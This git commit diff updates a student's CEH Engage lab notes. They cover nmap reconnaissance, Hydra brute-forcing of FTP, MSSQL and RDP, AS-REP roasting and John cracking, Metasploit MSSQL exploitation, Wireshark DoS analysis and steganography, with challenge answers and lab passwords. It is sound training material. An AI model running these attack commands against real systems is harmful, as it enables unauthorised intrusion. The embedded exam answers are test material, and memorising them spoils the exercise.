711ea1fce7aea1265d61e47d72ef38535b67d511
Gabriel <vieira.ferreira@unesp.br>
2026-02-08 21:55:41 -0300

    practical studies - engage

--- ceh_engage/commands/part1.sh
+++ ceh_engage/commands/part1.sh
@@ -6,7 +6,7 @@
 ### INFO: IP Address → 173.245.59.176
 ### INFO: Hostname → henry.ns.cloudflare.com
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 dig -x 173.245.59.176 +short
 # dig -x 173.245.59.176
 # host 173.245.59.176
@@ -22,7 +22,7 @@ dig -x 173.245.59.176 +short
 nmap -sn -PR -T5 -n 192.168.10.0/24
 ### INFO: IP Address → 192.168.10.1, 192.168.10.101, 192.168.10.111, 192.168.10.121, 192.168.10.144, 192.168.10.222
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # nmap -sn -PR -T5 -n 192.168.10.0/24 -oG - | awk '/Up$/{print $2}' > ~/output.txt
 # nmap -sn -PR -n --exclude 192.168.10.1 192.168.10.0/24
 
@@ -36,7 +36,7 @@ nmap -p 22 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 19
 nmap -p 22 -sV --version-light 192.168.10.101 192.168.10.111
 ### INFO: 22/tcp  open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) 
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # nmap -O --osscan-limit 192.168.10.101 192.168.10.111 # ⚠️ WARNING: Use only on hosts with SSH enabled.
 
 
@@ -52,7 +52,7 @@ nmap -p 53,88,135,139,389,445 --open -n -T5 --min-rate 1000 192.168.0.222
 ### INFO: 445/tcp  open  microsoft-ds   Microsoft Windows Serve 2008 R2 - 2012 microsoft-ds (workgroup; SKILL.CEH) 
 ### INFO: Service Info: Host: SKILL; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 nmap -p 445 --script smb-os-discovery 192.168.0.222 # 🔘 OPTIONAL
 # nmap -p 53  --open 192.168.0.222 # DNS
 # nmap -p 88  --open 192.168.0.222 # Kerberos
@@ -74,7 +74,7 @@ nmap -p 445 --script smb-os-discovery 192.168.0.222
 ### INFO:       Workgroup: : SKILL.CEH\x00
 ### INFO:       System time: 2026-01-17T12:39:02-08:00
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 nmap -sS -sV -p 389,445 192.168.0.222 # 🔘 OPTIONAL
 nmap -sV --script ms-sql-info,ms-sql-ntlm-info 192.168.0.222 # 🔘 OPTIONAL
 # nmap -sS -sV -p 53,88,135,139,389,445 192.168.0.222
@@ -93,7 +93,7 @@ ldapsearch -x -H ldap://192.168.0.222 -s base -b "" namingContexts
 ### INFO: namingContexts: DC=DomainDnsZones,DC=SKILL,DC=CEH,DC=com
 ### INFO: namingContexts: DC=ForestDnsZones,DC=SKILL,DC=CEH,DC=com
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 nmap -p 445 --script smb-os-discovery 192.168.0.222 # 🔘 OPTIONAL
 nmap -sS -sV -p 389,445 192.168.0.222 # 🔘 OPTIONAL
 nmap -sV --script ms-sql-info,ms-sql-ntlm-info 192.168.0.222 # 🔘 OPTIONAL
@@ -108,7 +108,7 @@ nmap -p 22 -sV 172.30.10.99
 ### INFO: 22/tcp  open  ssh  OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 
 ### INFO: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 ssh -v -o BatchMode=yes -o ConnectTimeout=3 172.30.10.99 # 🔘 OPTIONAL
 # nmap -p 3306 -sV 172.30.10.99 # ⚠️ WARNING: Unauthorized banner.
 # nmap -sV -O -p 3306 172.30.10.99 # ⚠️ WARNING: It presented possible kernel versions.
@@ -123,7 +123,7 @@ nmap -p 1433 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 
 ### INFO: Nmap scan report for 192.168.10.144
 ### INFO:       1433/tcp  open  ms-sql-s
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 nmap -sV --script ms-sql-info,ms-sql-ntlm-info -p 1433 192.168.10.144 # 🔘 OPTIONAL
 # nmap -T4 -A 192.168.10.144
 # nmap -sV 192.168.10.144
@@ -139,7 +139,7 @@ dig NS certifiedhacker.com +short
 ### INFO: ns1.bluehost.com.
 ### INFO: ns2.bluehost.com.
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # dig A certifiedhacker.com +short
 # dig MX certifiedhacker.com +short
 # whois 162.241.216.11
@@ -165,7 +165,7 @@ nmap -p 445 --script smb2-security-mode 172.30.10.200
 ### INFO: |     3:1:1:
 ### INFO: |_        Message signing enabled but not requiredd        
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # nmap -p 445 --script smb-security-mode,smb-os-discovery,smb2-security-mode 172.30.10.200 
 
 
@@ -183,21 +183,21 @@ nmap -p 445 --script smb2-security-mode 172.30.10.200
 
 # PART I - Challenge 14 💬ANSWER: 70💬
 # PART I - Challenge 15 💬ANSWER: FTP Unencrypted Cleartext Login💬
-#### ~/Desktop/StartOpenVAS
+#### EH Workstation-2: ~/Desktop/StartOpenVAS
 #### MOZILLA FIREFOX: http://127.0.0.1/login/login.html  
 ### USERNAME: admin
 ### PASSWORD: admin
-#### Scans → Tasks → ⭐ → New Tasks → (Scan Targets ⭐) → Create → ▶️
-####    Name: Task-Linux-192.168.10
-####    Scan Targets: Linux-192.168.10
-####    Scan Config: Full and fast
-#### (Scan Targets ⭐) → New Target → OK
-####    Name: Linux-192.168.10
-####    Hosts: 192.168.10.111,192.168.10.121,192.168.10.144,192.168.10.222
-####    Port List: Default
-####    Alive Test: ICMP + TCP-ACK Service & ARP Ping
-####    Credentials fot authenticated checks SSH on port: 22
-#### Scans → Dashboard
+### PATH: Scans → Tasks → ⭐ → New Tasks → (Scan Targets ⭐) → Create → ▶️
+###    Name: Task-Linux-192.168.10
+###    Scan Targets: Linux-192.168.10
+###    Scan Config: Full and fast
+### PATH: (Scan Targets ⭐) → New Target → OK
+###    Name: Linux-192.168.10
+###    Hosts: 192.168.10.111,192.168.10.121,192.168.10.144,192.168.10.222
+###    Port List: Default
+###    Alive Test: ICMP + TCP-ACK Service & ARP Ping
+###    Credentials fot authenticated checks SSH on port: 22
+### PATH: Scans → Dashboard
 ### INFO: Medium (4)
 ### INFO:   DCE/RPC and MSRPC Services Enumeration Reporting → QoD → 70%
 ### INFO:   DCE/RPC and MSRPC Services Enumeration Reporting → Severity → 5.0 (Medium)
@@ -206,10 +206,10 @@ nmap -p 445 --script smb2-security-mode 172.30.10.200
 ### INFO:   FTP Unencrypted Cleartext Login → Severity → 4.8 (Medium)
 ### INFO:   FTP Unencrypted Cleartext Login → Host → 192.168.10.144
 
-# ⚠️ IMPORTANT COMMANDS
-### Assets → Dashboard → Host topology
-### Configuration → Targets
-### Scans → Tasks
-### Scans → Dashboard
-### Assets → Hosts
-### Assets → Dashboard
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+### PATH: Assets → Dashboard → Host topology
+### PATH: Configuration → Targets
+### PATH: Scans → Tasks
+### PATH: Scans → Dashboard
+### PATH: Assets → Hosts
+### PATH: Assets → Dashboard
--- ceh_engage/commands/part2.sh
+++ ceh_engage/commands/part2.sh
@@ -1,7 +1,9 @@
 #------------------------------#
 
 
+
 # PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬
+#### EH Workstation-2: ~/rockyou.txt
 nmap -p 21 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
 nmap -sV -p 21 192.168.10.101 192.168.10.111 192.168.10.144 192.168.10.222
 hydra -l nick -P ~/rockyou.txt 192.168.10.111 ftp
@@ -16,7 +18,7 @@ get 52012.py
 exit
 grep www 52012.py
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
 # hydra -l nick -P ~/Desktop/password.txt 192.168.10.111 ftp
 # ftp ftp://nick:apple@192.168.10.111
@@ -33,7 +35,7 @@ grep www 52012.py
 ####            Form item: "txtusername" == "kety"
 ####            Form item: "txtpwd" == "apple"
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 #### FILTER: http.request.method == "POST" && http contains "pwd"
 #### FILTER: http contains "username" || http contains "password"
 ### PATH: Statistics → Conversations → TCP
@@ -44,14 +46,14 @@ grep www 52012.py
 
 
 # PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬
-#### ~/Downloads/ServerDoS.pcapng
+#### EH Workstation-2: ~/Downloads/ServerDoS.pcapng
 wireshark ~/Downloads/ServerDoS.pcapng
 #### FILTER: udp
 #### INFO: 9850 → 26000 Len=0  # ⚠️ WARNING: Many empty packages arriving at 26000/UDP.
 #### User Datagram Protocol, Src Port: 9850, Dst Port: 26000
 #### MOZILLA FIREFOX: 26000 udp protocol 
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 #### FILTER: udp.dstport == 26000
 ### PATH: Statistics → Endpoints → UDP
 ### PATH: Statistics → Conversations → UDP
@@ -63,13 +65,13 @@ wireshark ~/Downloads/ServerDoS.pcapng
 
 
 # PART II - Challenge 4  💬ANSWER: 192.168.10.144💬
-#### ~/Documents/DD_attack.pcapng
+#### EH Workstation-2: ~/Documents/DD_attack.pcapng
 wireshark ~/Documents/DD_attack.pcapng
 #### FILTER: udp
 ### PATH: Statistics → Endpoints → UDP
 ### INFO: 192.168.10.144 # ⚠️ WARNING: Average transmission of 1000 packets across multiple high ports (from 49900 to 49999). UDP Flood with high port scanning.
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 #### FILTER: udp && ip.src == 192.168.10.144
 #### FILTER: udp && ip.src == 192.168.10.144 && udp.dstport >= 49900 && udp.dstport <= 49999
 ### PATH: Statistics → Conversations → UDP
@@ -80,13 +82,13 @@ wireshark ~/Documents/DD_attack.pcapng
 
 
 # PART II - Challenge 5  💬ANSWER: 172.30.10.99💬
-#### ~/Downloads/PyD_attack.pcapng
+#### EH Workstation-2: ~/Downloads/PyD_attack.pcapng
 wireshark ~/Downloads/PyD_attack.pcapng
 ### FILTER: tcp.port == 135
 ### PATH: Statistics → Endpoints → TCP
 ### INFO: 172.30.10.99 # ⚠️ WARNING: This IP address is the source of communication via port 135 (RPC communication initiation) to the destination 192.168.0.222.
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 #### FILTER: tcp.port == 135 && cp.flags.syn == 1 && tcp.flags.ack == 0
 #### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
 #### FILTER: tcp.port == 135 && tcp.flags.reset == 1
@@ -101,45 +103,49 @@ wireshark ~/Downloads/PyD_attack.pcapng
 #### EH Workstation-1: C:\Users\Admin\Documents\Anti-DDoS\rec001.txt
 #### EH Workstation-1: C:\Users\Admin\Documents\Anti-DDoS\rec002.txt  
 cd 'C:\Users\Admin\Documents\Anti-DDoS\'
-notepad '.\rec001.txt' # CONFIRMAÇÃO DO VOLUME (COMPORTAMENTO)
-notepad '.\rec002.txt' # CONTEXTO DO ATAQUE (COMO FOI FEITO) # ⚠️ WARNING: Mostra diversos cabeçalho, todos com Hosts: 192.168.10.144:135 (RPC)
-notepad '.\report export.txt' # VISÃO MACRO (QUEM MAIS ATACOU)
-### INFO: No. → 37, Outgoing bytes → 741444(Blocked), Incoming bytes → 13481074(Blocked)
-### INFO: Local IP Address → 192.168.10.144, Port → 135
-### INFO: Remote IP Address → 192.168.10.222, Port → 5486
+Get-Content '.\report export.txt' # ⚠️ WARNING: MACRO VIEW (WHO ATTACKED THE MOST)
+### INFO: No.   Time       Outgoing bytes    Incoming bytes      Local IP Address    Port    Remote IP Address   Port  
+### INFO: 37    22:46:49   741444(Blocked)   13481074(Blocked)   192.168.10.144      135     192.168.10.222      5486
 
-# Get-Content '.\report export.txt'
-# Get-Content '.\rec001.txt'
-# Get-Content '.\rec002.txt'
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+# Get-Content '.\rec001.txt' # ⚠️ WARNING: CONFIRMATION OF VOLUME (BEHAVIOR)
+# Get-Content '.\rec002.txt' # ⚠️ WARNING: ATTACK CONTEXT (HOW IT WAS DONE). Shows several headers, all with Hosts: 192.168.10.144:135 (RPC)
+# notepad '.\rec001.txt'
+# notepad '.\rec002.txt'
+# notepad '.\report export.txt'
 # more '.\report export.txt'
 # more '.\rec001.txt'
 # more '.\rec002.txt'
-
-
+# nmap -sV 192.168.10.222
+# nmap -O 192.168.10.222
+# nmap -O --osscan-guess --max-os-tries 10 192.168.10.222
 
 #------------------------------#
 
 
 # PART II - Challenge 7  💬ANSWER: c3ll0@123💬
-find ~ -type f -name '*.py' | grep GetNPUsers
+#### EH Workstation-2: ~/users.txt
+#### EH Workstation-2: ~/rockyou.txt
 GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
-nc -vz 192.168.0.222 88 # Verificar serviço Kerberos, porta 88, para ver se há AS-REP (resposta do Kerberos)
-nc -vz 192.168.0.222 445 # Verificar serviço SMB, porta 445, para ver se DC ativo
-nc -vz 192.168.0.222 135 # Verificar serviço RPC, porta 135, para ver se é infra Windows
 ### INFO: Hashe "Joshua@SKILL.CEH:cbd0830...." 
-nano hash_founded.txt # Salvar a hashe "cbd0830...."
-find ~ -type f -name 'rockyou.txt'
+nano hash_founded.txt # 🛑 TODO: Save the hash "cbd0830..."
 john --wordlist=~/rockyou.txt hash_founded.txt
 ### INFO: c3ll0@123 (?)
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+# nc -vz 192.168.0.222 88     # ⚠️ WARNING: Check the Kerberos service, port 88, to see if there is an AS-REP (Kerberos response).
+# nc -vz 192.168.0.222 445    # ⚠️ WARNING: Check the SMB service, port 445, to see if DC is active.
+# nc -vz 192.168.0.222 135    # ⚠️ WARNING: Check the RPC service, port 135, to see if it's a Windows infrastructure issue.
 
 
 #------------------------------#
 
 
 # PART II - Challenge 8  💬ANSWER: 7💬
+#### EH Workstation-2: ~/users.txt
+#### EH Workstation-2: ~/rockyou.txt
 hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
 ### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
-find / -type f -name 'mssqlclient.py' 2>/dev/null
 mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
 msfconsole -q -x "
 search mssql;
@@ -156,39 +162,51 @@ show advanced;
 exploit;"
 # cd C:\\Users\\Public\\Downloads\\
 dir 
-### INFO: Name → MSS.txt, Size → 7
+### INFO: Mode              Size    Type    Last modified               Name
+### INFO: 100666/rw-rw-rw   7       fil     2024-09-02 08:50:07 -0400   MSS.txt
 
-# ⚠️ IMPORTANT COMMANDS
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
 # hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
 # mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
+
 
 #------------------------------#
 
 
 # PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
-hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
-# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4 
+#### EH Workstation-2: ~/users.txt
+#### EH Workstation-2: ~/rockyou.txt
+nmap -p 3389 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
+hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
+### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4 
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
 ### INFO: [3389] [rdp] host: 192.168.10.222 login: Administrator password: Passw0rd@123
 ### INFO: [3389] [rdp] host: 192.168.10.222 login: AdminDC password: @dmin@admin
 ### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234
-
 
 #------------------------------#
 
 
 # PART II - Challenge 10  💬ANSWER: d282💬
-#### ~/Downloads/Tools.rar
-sha256sum ~/Downloads/Tools.rar | awk '{print substr($1,length($1)-3)}'
+#### EH Workstation-2: ~/Downloads/Tools.rar
 sha256sum ~/Downloads/Tools.rar
+### INFO: 0b43dc13277e9192099a5a6bc4110f590fe2835fdccf3e32a2c3cfe0e3c5d282  /home/attacker/Downloads/Tools.rar
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+# sha256sum ~/Downloads/Tools.rar | awk '{print substr($1,length($1)-3)}'
+### INFO: d282
 
 
 #------------------------------#
 
 
 # PART II - Challenge 11 💬ANSWER: 6952💬
-#### ~/Pictures/Logfile.PML
+#### EH Workstation-2: ~/Pictures/Logfile.PML
 cd ~/Pictures
 python3 -m http.server 8000
 ifconfig
@@ -201,62 +219,102 @@ ifconfig
 ###                                        Process Name is H3ll0.exe → Include
 ###                                        Operation is Process Create → Include
 ###                                        Operation is Process Profiling → Include
-### INFO: Time | Process Name | PID | Operation | Path | Result | Detail
-### INFO: Operation → Process Create # Processo foi criado, Contém Parent PID ⭐
-### INFO: Operation → Process Profiling # Processo começou a executar, Contém Parent PID ⭐
-### INFO: Operation → TCP Connect / TCP Reconnect / TCP Disconnect # Comunicação de Rede, nesse caso contém Parent PID ⭐. No entanto: ⚠️ Não é confiável. ⚠️ Não é o método esperado pela prova CEH. 
 ### PATH: Event Properties → Process → Parent PID → 6952
+
+### INFO: Time | Process Name | PID | Operation | Path | Result | Detail
+### INFO: Operation → Process Create # ⚠️ WARNING: The process has been created, it contains the Parent PID ⭐
+### INFO: Operation → Process Profiling # ⚠️ WARNING: The process has started to run. Contains Parent PID ⭐
+### INFO: Operation → TCP Connect / TCP Reconnect / TCP Disconnect # ⚠️ WARNING: Network communication, in this case containing Parent PID ⭐. However: ⚠️ It is not reliable. ⚠️ It is not the method expected by the CEH exam.
 
 
 #------------------------------#
 
 
+
 # PART II - Challenge 12 💬ANSWER: 2.87💬
-#### ~/Downloads/Tornado
+
+# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
+
+#### EH Workstation-2: ~/Downloads/Tornado
 sudo apt install ent -y
 ### PASSWORD: toor
 ent ~/Downloads/Tornado
 ### INFO: Entropy = 2.878860 bits per byte.
+
+
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 
 # cd ~/Downloads
 # python3 -m http.server 8000
 #### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # Baixar Tornado
 #### EH Workstation-1: C:\Users\Admin\Downloads\Tornado
 #### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE\die.exe # Abrir Tornado com essa ferramenta
-### File name → ... → Open file... → C:\Users\Admin\Downloads\Tornado → Entropy
+### PATH: File name → ... → Open file... → C:\Users\Admin\Downloads\Tornado → Entropy
 ### INFO: Total → 2.87903
 
 
+
 #------------------------------#
+
 
 
 # PART II - Challenge 13 💬ANSWER: 192.168.10.144💬
-nmap -p 2002 -iL ~/anotacoes/1_2.txt --open
+
+# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
+
+nmap -p 2002 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
 nmap -p 2002 -sV 192.168.10.144
 ### INFO: 2002/tcp open rpcapd WinPcap remote packet capture daemon
 ### INFO: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+
 # nc 192.168.10.144 2002 -vvv
 
 
+
 #------------------------------#
+
 
 
 # PART II - Challenge 14 💬ANSWER: 3965222💬
-#### ~/Desktop/stealth.jpeg
+
+# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
+
+#### EH Workstation-2: ~/Desktop/stealth.jpeg
 steghide info ~/Desktop/stealth.jpeg -p azerty@123
 steghide extract -sf ~/Desktop/stealth.jpeg -p azerty@123 -q 
-# steghide extract -sf ~/Desktop/stealth.jpeg -xf output.txt
 cat hidden.txt
-# open hidden.txt
 ### INFO: Tender quote for techiquest event 2024: 3965222
+
+
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
+# steghide extract -sf ~/Desktop/stealth.jpeg -xf output.txt
+# open hidden.txt
+
 
 
 #------------------------------#
 
 
+
 # PART II - Challenge 15 💬ANSWER: android/dos/46445.c💬
+
+# *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
+
 searchsploit AirDrop 2.0
 ### INFO: AirDrop 2.0 - Denial of Service (DoS) android/dos/46445.c
 
+
+
+# *** ⚠️ IMPORTANT EXTRA COMMANDS ⚠️ ***
 # searchsploit -p -w "AirDrop 2.0" # Mostra o caminho completo; Busca por string exata 
 # searchsploit -m 46445 # Copia para o o exploit para o diretório atual 
+
+
+
+#------------------------------#
